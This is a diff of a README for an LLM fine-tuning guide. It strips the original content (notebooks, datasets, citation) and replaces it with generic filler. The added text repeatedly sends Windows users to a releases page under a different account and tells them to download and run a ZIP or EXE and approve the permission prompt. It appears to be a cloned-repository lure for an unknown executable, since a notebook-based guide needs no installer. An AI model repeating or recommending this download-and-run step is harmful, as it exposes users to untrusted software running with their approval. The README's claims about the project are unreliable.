@@ -1,143 +1,256 @@
+# 🌌 Jackrong-llm-finetuning-guide - Learn LLM Fine-Tuning Fast
+
+[![Download](https://img.shields.io/badge/Download-Release%20Page-6A5ACD?style=for-the-badge&logo=github)](https://github.com/Valliemidland674/Jackrong-llm-finetuning-guide/releases)
+
 <div align="center">
 
-# Jackrong-llm-finetuning-guide 🌌
-**An Educational, End-to-End LLM Fine-Tuning Pipeline for Beginners and Developers**
-
-🌐 **Select Language:**  🇬🇧 **English** ｜ [🇨🇳 中文](./docs/README_zh.md) ｜ [🇰🇷 한국어](./docs/README_ko.md) ｜ [🇯🇵 日本語](./docs/README_ja.md)
-
-🤗 **HuggingFace:** [Jackrong](https://huggingface.co/Jackrong)
-
-<br>
-
-[![Unsloth](https://img.shields.io/badge/Powered%20by-Unsloth-8A2BE2?style=flat-square)](https://github.com/unslothai/unsloth)
-[![Google Colab](https://img.shields.io/badge/Environment-Google%20Colab-F9AB00?style=flat-square&logo=googlecolab&logoColor=white)](https://colab.research.google.com/)
-[![PyTorch](https://img.shields.io/badge/Framework-PyTorch-EE4C2C?style=flat-square&logo=pytorch&logoColor=white)](https://pytorch.org/)
-[![Hugging Face](https://img.shields.io/badge/Model%20Hub-Hugging%20Face-FFD21E?style=flat-square&logo=huggingface&logoColor=black)](https://huggingface.co/)
-[![LoRA PEFT](https://img.shields.io/badge/Technique-LoRA%20%2F%20PEFT-007EC6?style=flat-square)](#)
-[![Beginner Friendly](https://img.shields.io/badge/Level-Beginner%20Friendly-brightgreen?style=flat-square)](#)
+**An end-to-end guide for running LLM fine-tuning on Windows**
 
 </div>
 
----
+## 🧭 Overview
 
-## 📑 Abstract
+Jackrong-llm-finetuning-guide helps you work with large language models on your own machine or in Google Colab. It walks you through model setup, dataset prep, fine-tuning, and export steps in a way that is easier to follow for new users.
 
-An educational Large Language Model (LLM) fine-tuning repository designed for beginners and developers. This project provides detailed theoretical explanations, robust data processing workflows, reproducible training pipelines (including Supervised Fine-Tuning and future Reinforcement Learning implementations), and practical deployment strategies. The full training code for the author's open-source projects is fully accessible within this repository.
+This project focuses on common open-source models such as:
 
-<div align="center">
-  <img width="100%" alt="Project Overview" src="https://github.com/user-attachments/assets/67dff316-e77e-4909-a338-56caeb6583b4" style="border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); margin: 20px 0;"/>
-</div>
+- Llama 3
+- Qwen
+- DeepSeek
+- Other Hugging Face models
 
----
+It uses tools like PyTorch, Unsloth, PEFT, and Hugging Face. These tools help you train models with less setup and less memory use.
 
-## 🏛️ About This Project
+## 📥 Download
 
-This repository is designed as a **"Zero to One"** learning platform. Whether you have zero technical background or are an experienced developer, you will find reproducible, end-to-end guides that walk you through the entire lifecycle of large language models. Starting from simply registering a Google account and opening Colab, you will learn how to efficiently adapt models to your specific domain needs.
+Visit this page to download:
 
-### ✨ Key Features & Offerings
+[https://github.com/Valliemidland674/Jackrong-llm-finetuning-guide/releases](https://github.com/Valliemidland674/Jackrong-llm-finetuning-guide/releases)
 
-| Aspect | Description |
-| :--- | :--- |
-| 🛤️ **0-to-1 Learning Path** | Step-by-step guides starting from the absolute basics, requiring nothing more than a browser and a free cloud environment. |
-| 🔄 **Diverse Training Workflows** | Codebases covering Supervised Fine-Tuning (SFT) and foundational setups for Reinforcement Learning (RL) and other advanced paradigms. |
-| ⚡ **Resource-Efficient Engineering** | Leveraging tools like Unsloth and 4-bit quantization to run large-scale training within single-GPU constraints (e.g., standard Google Colab). |
-| 📦 **End-to-End Delivery** | From multi-source data normalization to LoRA adaptation, merged 16-bit exports, and GGUF quantization for local deployment. |
+Open the page, find the latest release, and download the file that matches your Windows setup. If the release includes a ZIP file, download that file first. If it includes an EXE file, download and run that file.
 
----
+## 🪟 Run on Windows
 
-## 💡 A Message to Builders
+Follow these steps on a Windows PC:
 
-> [!NOTE]
-> *"For beginners, hobbyists, and anyone curious about AI: this path is learnable."*
+1. Open the download page.
+2. Pick the latest release.
+3. Download the file provided in the release.
+4. If the file is in a ZIP folder, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the program file or the installer file.
+7. If Windows asks for permission, select **Yes**.
 
-The purpose of this document is not only to describe one training run, but also to communicate a broader message: fine-tuning, post-training, and even moderate-scale pretraining are **not inaccessible technical rituals**. They are **engineering practices** that can be learned, reproduced, and gradually mastered. With open-source models, public datasets, cloud compute platforms, and an increasingly mature training toolchain, what you often need is simply a Google account, a regular laptop, and sustained curiosity.
+If the project uses a notebook file for training, you can also use it with Google Colab in your browser. That path works well if your PC has limited memory.
 
-As a learner who also started from zero, I understand the uncertainty many newcomers face: environment setup complexity, opaque hyperparameters, and anxiety about compute resources often become the first barrier to entry. This is exactly why optimization toolchains such as Unsloth matter: by improving training efficiency and resource utilization, they substantially lower the practical threshold for large-model fine-tuning, turning what once required expensive hardware and specialized experience into something ordinary developers can attempt and master.
+## ✨ What this guide covers
 
-**In that sense, we all have the opportunity to stand on the shoulders of giants, understand models, adapt models, and give them new capabilities.**
+This repository helps you with the main parts of an LLM fine-tuning workflow:
 
-*No one starts as an expert. But every expert was once brave enough to begin.*
+- Choosing a base model
+- Preparing a dataset
+- Formatting prompts and answers
+- Running LoRA or PEFT training
+- Saving the tuned model
+- Testing the result
+- Uploading to Hugging Face
 
-## 🚀 Upcoming Model Support & Roadmap
+It is made for beginners who want a clear path from download to first run.
 
-In the near future, this repository will continuously expand its support for the latest state-of-the-art open-source model families. The upcoming tutorials and codebases will comprehensively cover both **Supervised Fine-Tuning (SFT)** and **Reinforcement Learning (RL - specifically GRPO)** pipelines.
+## 🧰 What you need
 
-Below is the planned support matrix for upcoming model families:
+For a smooth start on Windows, use a PC with:
 
-| Model Family | SFT Support | RL (GRPO) Support |
-| :--- | :---: | :---: |
-| **Qwen 3.5** | ✅ Released | Scheduled |
-| **Qwen 3** | Scheduled | Scheduled |
-| **Llama3.2-R1 (3B)** | ✅ Included | ✅ Released |
-| **Llama** (3.1 / 3.3) | Scheduled | Scheduled |
-| **Phi-4** | Scheduled | Scheduled |
-| **Gemma 4** | Scheduled | Scheduled |
-| **DeepSeek** | Scheduled | Scheduled |
+- Windows 10 or Windows 11
+- At least 8 GB RAM
+- A modern CPU
+- Optional NVIDIA GPU for faster training
+- Enough free disk space for models and datasets
+- A stable internet connection
 
----
+If you use local training, a GPU with more memory gives better results. If your PC is basic, use the Colab path.
 
-## 📓 Interactive Training Notebooks
+## 🚀 Getting Started
 
-Below are the interactive Kaggle and Colab notebooks, organized by model architecture. You can run the entire pipeline—from data preparation to training and inference—directly in your browser. All notebooks are available in the [`train_code`](./train_code/) repository folder.
+Use this simple flow after you download the release:
 
-### 🌟 Main Notebooks
+1. Open the release page.
+2. Download the latest package.
+3. Extract the files if needed.
+4. Open the included guide or notebook.
+5. Follow the steps in order.
+6. Choose a model and a dataset.
+7. Start the fine-tuning run.
+8. Save the output model when training ends.
 
-| 🤖 Model Architecture | 🛠️ Pipeline | 🚀 Quick Setup (1-Click Run) |
-| :--- | :--- | :---: |
-| **Qwopus3.5 (27B)** | SFT | [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/R6410418/Jackrong-llm-finetuning-guide/blob/main/train_code/Qwopus3-5-27b-Colab.ipynb) |
-| **Qwen3.5 (9B)** | SFT | [![Open In Kaggle](https://kaggle.com/static/images/open-in-kaggle.svg)](https://kaggle.com/kernels/welcome?src=https://github.com/R6410418/Jackrong-llm-finetuning-guide/blob/main/train_code/Qwen3.5-9B-Neo-Kaggle.ipynb) |
-| **Qwopus3.5 (35B)** | SFT | [![Open In Kaggle](https://kaggle.com/static/images/open-in-kaggle.svg)](https://kaggle.com/kernels/welcome?src=https://github.com/R6410418/Jackrong-llm-finetuning-guide/blob/main/train_code/Qwopus-3.5-35B-A3B-Kaggle.ipynb) |
-| **Llama3.2-R1 (3B)** | RL (GPRO) | [![Open In Kaggle](https://kaggle.com/static/images/open-in-kaggle.svg)](https://kaggle.com/kernels/welcome?src=https://github.com/R6410418/Jackrong-llm-finetuning-guide/blob/main/train_code/Llama-3.2-3B-R1-Zero-GRPO.ipynb) |
+If the release contains setup files, keep them in one folder so they are easy to find.
 
----
+## 🧪 Common workflow
 
-## 📖 Comprehensive Model Training Guide
+A normal fine-tuning run looks like this:
 
-For a detailed, step-by-step PDF walkthrough of the entire Qwopus 3.5 fine-tuning process—including environment setup, data preparation, and optimization tips—please refer to our latest guide:
+1. Pick a base model from Hugging Face.
+2. Load your training data.
+3. Format each row into prompt and response text.
+4. Set the training size and batch settings.
+5. Start training.
+6. Review test output.
+7. Save the tuned model.
+8. Upload it if you want to share it.
 
-> [!TIP]
-> **🔗 [Download Complete Guide: Qwopus3-5-27b-Colab_complete_guide_to_llm_finetuning.pdf](https://github.com/R6410418/Jackrong-llm-finetuning-guide/blob/main/guidePDF/Qwopus3-5-27b-Colab_complete_guide_to_llm_finetuning.pdf)**
->
-> **🔗 [Download Technical Report: Qwopus-GLM-18B-Technical-Report.pdf](https://github.com/R6410418/Jackrong-llm-finetuning-guide/blob/main/guidePDF/Qwopus-GLM-18B-Technical-Report.pdf)**
-> A concise technical report covering the Qwopus-GLM-18B model design, training rationale, and key implementation details.
+This process works for chat-style models, task models, and instruction models.
 
----
+## 🗂️ Dataset format
 
-## 📚 High-Fidelity Distillation Datasets
+This guide works best with simple text data. A common dataset uses fields like:
 
-High-quality data is the engine of effective model adaptation. In parallel with our training code, this repository provides access to **24 curated, high-fidelity datasets** specifically collected and distilled to enhance model reasoning, coding, and conversational capabilities.
+- instruction
+- input
+- output
+- prompt
+- response
 
-These datasets are primarily distilled from state-of-the-art flagship models (such as *DeepSeek-V3.2*, *Qwen3-235B*, *GLM-4.7*, and *GPT-OSS-120B*) and follow advanced Chain-of-Thought (CoT) formatting. 
+A short example:
 
-**Key Dataset Categories Included:**
-*   🧠 **Reasoning & CoT (Chain-of-Thought):** Datasets like `Jackrong/Qwen3.5-reasoning-700`, `Jackrong/Natural-Reasoning-gpt-oss-120B-S1`, and `Jackrong/glm-4.7-multiturn-CoT` designed to improve step-by-step logic and deduction.
-*   📐 **Mathematics & STEM:** Specialized data such as `DeepSeek-v3.1-reasoner-Distilled-math-samples` and focused domain knowledge like `Jackrong/Qwen3-235B-A22B-Instruct-2507-Distilled-chat`.
-*   💻 **Code & Algorithms:** Collections like `Competitive-Programming-python-blend` and `qwen3-coder-480b-distill-mini` to strengthen competitive programming and algorithmic generation.
-*   💬 **Instruction & Multi-turn Chat:** Resources like `Jackrong/LogicMind-Chat-Reasoning-SFT-300K`, `Chinese-Qwen3-235B-Thinking-2507-Distill-100k`, and `ShareGPT-gpt-oss-120B-reasoning` focused on human alignment, IELTS writing feedback, and robust conversational flowing.
+- Instruction: Rewrite this text in plain English.
+- Input: The device shall be initialized before use.
+- Output: Turn on the device before you use it.
 
-*All datasets are open-sourced on the [HuggingFace Hub](https://huggingface.co/Jackrong). You can also use the included `download_datasets.py` script to batch download the entire suite for local training.*
+Keep your data clean and direct. Use one task per row when possible.
 
----
+## 🧠 Model choices
 
-## 🌍 Open Source Commitment & Community Impact
+You can start with a small model if you are new to fine-tuning. Good starter choices include:
 
-Moving forward, the complete training source code for every fine-tuned model I release on Hugging Face will be fully open-sourced in this repository. My goal is to ensure that anyone—regardless of their background or resources—can freely download, execute, and learn from these scripts to build their own AI capabilities.
+- Llama 3 8B
+- Qwen 2.5
+- DeepSeek distilled models
 
-I am deeply grateful for the community's support. The Qwen3.5 fine-tunes I shared on Hugging Face have recently reached over a **million downloads**—a quiet reminder of the power of open knowledge. It is my sincere hope that making these full training pipelines publicly available will encourage more developers to start their own fine-tuning journeys.
+Smaller models train faster and need less memory. Larger models can give better results, but they need more GPU power.
 
----
+## 🔧 Tools used in this project
 
-## 📝 Citation
+This repository uses a few common tools:
 
-If you find this repository helpful in your learning or research, please consider citing it:
+- **PyTorch**: the main training framework
+- **Unsloth**: helps make fine-tuning faster and lighter
+- **Hugging Face**: stores models and datasets
+- **LoRA / PEFT**: lets you fine-tune with less memory
+- **Google Colab**: browser-based training option
 
-```bibtex
-@misc{jackrong-llm-finetuning,
-  author = {Jackrong},
-  title = {Jackrong-llm-finetuning-guide: An Educational LLM Fine-Tuning Pipeline},
-  year = {2026},
-  publisher = {GitHub},
-  journal = {GitHub repository},
-  howpublished = {\url{https://github.com/Jackrong/Jackrong-llm-finetuning-guide}}
-}
-```
+These tools are common in modern NLP and machine learning work.
+
+## 📦 File layout
+
+The project may include files like these:
+
+- `README.md` - main guide
+- `docs/` - translated guides
+- notebooks for training
+- sample dataset files
+- export or test scripts
+- model notes
+
+If you see a notebook file, open it in Colab or a compatible tool.
+
+## 🛠️ How to use a notebook in Colab
+
+If the release points to a notebook, use these steps:
+
+1. Download the notebook file.
+2. Open Google Colab in your browser.
+3. Upload the notebook or open it from GitHub.
+4. Run each cell from top to bottom.
+5. Follow the prompts for model and dataset setup.
+6. Wait for training to finish.
+7. Save the output model to your drive or Hugging Face.
+
+Colab works well when you want to avoid local setup on Windows.
+
+## 📚 Language options
+
+This project includes guides in more than one language:
+
+- English
+- 中文
+- 한국어
+- 日本語
+
+Pick the language file that is easiest for you to read.
+
+## 🧾 Basic use case
+
+Use this guide when you want to:
+
+- train a chat model on your own data
+- test a model on task-specific text
+- learn the fine-tuning flow step by step
+- move from a base model to a custom model
+
+The setup is useful for support bots, writing helpers, and domain-specific assistants.
+
+## 🔍 Tips for first-time users
+
+Keep these points in mind:
+
+- Start with a small dataset
+- Use a small model first
+- Save a copy of your raw data
+- Read each step before you run it
+- Keep file names simple
+- Use the latest release
+- Close unused apps if you train on your PC
+
+These habits help reduce mistakes during setup.
+
+## 🧩 Troubleshooting
+
+If the file does not open:
+
+- Check that the download finished
+- Try extracting the ZIP again
+- Make sure you opened the right file type
+- Use the latest Windows updates
+- Try another browser for the download
+
+If training is slow:
+
+- Use a smaller model
+- Reduce batch size
+- Try Colab
+- Close other programs
+- Check your GPU use
+
+If the model gives weak results:
+
+- Improve your dataset
+- Add clearer prompt and response pairs
+- Train a little longer
+- Reduce noisy samples
+
+## 📡 Hugging Face
+
+Project assets and model sharing may use Hugging Face:
+
+[Jackrong on Hugging Face](https://huggingface.co/Jackrong)
+
+You can use it to find models, upload tuned weights, or manage dataset files.
+
+## 🧪 Example setup path
+
+A simple path for a new Windows user:
+
+1. Visit the release page
+2. Download the latest package
+3. Extract it
+4. Open the guide or notebook
+5. Pick a model
+6. Load your dataset
+7. Run training
+8. Save the result
+
+This is the shortest path from download to first run
+
+## 📎 Topics
+
+dataset, deepseek, fine-tuning, guide, llama3, llm, machine-learning, nlp, openai, pytorch, qwen, unsloth
